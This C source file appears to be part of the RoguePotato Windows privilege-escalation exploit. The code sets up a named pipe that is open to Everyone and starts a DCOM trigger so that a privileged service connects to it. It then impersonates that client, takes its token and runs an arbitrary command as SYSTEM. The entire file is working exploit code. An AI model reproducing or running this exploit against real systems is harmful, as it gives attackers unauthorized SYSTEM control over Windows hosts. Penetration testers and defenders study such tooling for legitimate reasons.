#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include <sddl.h>
#include "common.h"

extern wchar_t* commandline;

DWORD WINAPI PipeServer(LPVOID lpParam)
{
	//SEC sec;
	HANDLE  hPipe, hToken;
	BOOL    isConnected;
	SECURITY_ATTRIBUTES     sa;
	
	char buffer[256];
	DWORD dwRead = 0;
	LPWSTR PipeName = (LPWSTR)lpParam;
	//LPWSTR PipeName = (LPWSTR)lpParam;
	
	

	//sec.BuildSecurityAttributes(&sa);
	if (!InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION))
	{
		printf("InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());

		return 0;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		printf("ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());

		return 0;
	}



	hPipe = CreateNamedPipe(
		PipeName,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		sizeof(DWORD),
		0,
		NMPWAIT_USE_DEFAULT_WAIT,
		&sa);

	if (hPipe == INVALID_HANDLE_VALUE) {


		printf("[-] Error CreatePipe %d", GetLastError());
		return 0;
	}

	printf("[*] Listening on pipe %S, waiting for client to connect\n", PipeName);
	isConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
	if (isConnected)
	{
		printf("[*] Client connected!\n");
		ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL);
		if (!ImpersonateNamedPipeClient(hPipe)) {
			printf("[-] Failed to impersonate the client.%d %d\n", GetLastError(), dwRead);
			return 0;
		}
		OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hToken);
		if(ExecuteSystem(commandline, hToken))
			wprintf(L"[+] RoguePotato gave you the SYSTEM powerz :D\n");
		else
			wprintf(L"[-] RoguePotato something went wrong :-(\n");

	}
	else

		CloseHandle(hPipe);
	return 1;

}

DWORD WINAPI ThreadTriggerDCOM(LPVOID lParams) {
	TriggerDCOM();
	return 0;
}

int CreatePipeServer(wchar_t* pipename)
{
	HANDLE hThread1 = NULL;
	DWORD dwThreadId1 = 0;
	
	printf("[*] Creating Pipe Server thread..\n");
	hThread1 = CreateThread(NULL, 0, PipeServer, pipename, 0, &dwThreadId1);
	printf("[*] Creating TriggerDCOM thread...\n");
	CreateThread(NULL, 0, ThreadTriggerDCOM, NULL, 0, &dwThreadId1);
	DWORD dwWait = WaitForSingleObject(hThread1, THREAD_TIMEOUT);

	if (dwWait != WAIT_OBJECT_0)
	{
		wprintf(L"[-] Named pipe didn't received any connect request. Exiting ... \n");
		exit(-1);
	}

	return 1;
}